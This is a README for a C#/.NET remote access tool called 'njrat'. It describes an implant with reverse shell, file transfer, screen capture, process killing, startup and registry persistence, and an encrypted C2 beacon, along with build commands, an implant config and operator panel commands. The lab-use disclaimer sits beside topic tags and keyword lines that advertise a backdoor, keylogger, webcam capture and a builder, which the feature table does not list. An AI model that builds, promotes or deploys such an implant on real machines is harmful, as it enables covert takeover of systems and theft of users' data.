# njrat

> **WARNING — EDUCATIONAL / LAB USE ONLY**
>
> This project is a **research-grade Remote Access Tool** designed exclusively for
> authorized penetration testing, red-team exercises, and educational lab environments.
> Deploying it against systems you do not own or lack explicit written permission to
> test is **illegal** and violates computer-fraud laws in most jurisdictions.

---

## Features

| Module          | Description                                  |
|-----------------|----------------------------------------------|
| Reverse Shell   | Interactive cmd / PowerShell command pipe     |
| File Manager    | Upload, download, and directory listing       |
| Screen Capture  | Desktop screenshot capture (BMP stub)         |
| Process Manager | Enumerate and terminate processes             |
| Persistence     | Startup-folder / registry-key registration    |
| Heartbeat       | Configurable keepalive beacon                 |
| Encrypted Comms | AES-256-GCM transport encryption              |

## Architecture

```
┌──────────────┐         TCP + AES-GCM         ┌──────────────┐
│  Client      │◄──────────────────────────────►│  Panel (C2)  │
│  (Implant)   │   length-prefix framing        │  Console UI  │
└──────────────┘                                └──────────────┘
```

* **Client** — lightweight agent: reconnect loop, heartbeat, modular task executor.
* **Panel** — operator console: session manager, command router, listener.

## Build

```bash
# Restore & build everything
dotnet build

# Run the panel (listener)
dotnet run --project src/njrat.Panel

# Build the client
dotnet publish src/njrat.Client -c Release -r win-x64 --self-contained
```

## Client Configuration

Embedded in `ImplantConfig.cs` or overridden via environment:

```json
{
  "Host": "127.0.0.1",
  "Port": 4444,
  "Mutex": "njrat_mtx",
  "ReconnectDelayMs": 5000,
  "HeartbeatIntervalMs": 30000,
  "EncryptionKey": "CHANGE_THIS_KEY_32BYTES_LONG!!!!"
}
```

## Plugin API

Implement the `IModule` pattern to add custom capability modules:

```csharp
public interface IModule
{
    string Name { get; }
    byte[] Execute(byte[] payload);
}
```

Register modules in `TaskExecutor.RegisterModule(IModule)`.

## Transport Protocol

| Layer         | Detail                                 |
|---------------|----------------------------------------|
| Framing       | 4-byte big-endian length prefix        |
| Encryption    | AES-256-GCM (12-byte nonce, 16-byte tag) |
| Key exchange  | Pre-shared key (config-embedded)       |
| Keepalive     | Heartbeat packet every 30 s (default)  |

## Panel Commands

| Command       | Description                             |
|---------------|-----------------------------------------|
| `sessions`    | List active sessions                    |
| `use <id>`    | Select session                          |
| `shell <cmd>` | Execute command in reverse shell        |
| `upload`      | Upload file to client                   |
| `download`    | Download file from client               |
| `screenshot`  | Capture client screen                   |
| `ps`          | List client processes                   |
| `kill <pid>`  | Kill client process                     |
| `exit`        | Disconnect session                      |

## Requirements

| Component | Minimum                          |
|-----------|----------------------------------|
| Runtime   | .NET 10.0                        |
| OS        | Windows 10+ / Linux (x64, arm64) |

## Disclaimer

This software is provided **as-is** for **authorized security research only**.
The authors assume no liability for misuse. Always obtain written authorization
before deploying in any environment.

## License

MIT — see [LICENSE](LICENSE).


---

## Topics

![njrat](https://img.shields.io/badge/njrat-111827?style=flat-square) ![rat](https://img.shields.io/badge/rat-111827?style=flat-square) ![remote-access](https://img.shields.io/badge/remote%20access-111827?style=flat-square) ![remote-administration](https://img.shields.io/badge/remote%20administration-111827?style=flat-square) ![backdoor](https://img.shields.io/badge/backdoor-111827?style=flat-square) ![keylogger](https://img.shields.io/badge/keylogger-111827?style=flat-square) ![c-sharp](https://img.shields.io/badge/c%20sharp-111827?style=flat-square) ![dotnet](https://img.shields.io/badge/dotnet-111827?style=flat-square)

`njrat` `rat` `remote-access` `remote-administration` `backdoor` `keylogger` `c-sharp` `dotnet` `security` `tcp`

Search: njrat · plugins · cam · mic · njRAT classic — remote desktop, webcam, keylogger, plugin DLL loader, builder

---

<sub>njRAT classic — remote desktop, webcam, keylogger, plugin DLL loader, builder</sub>
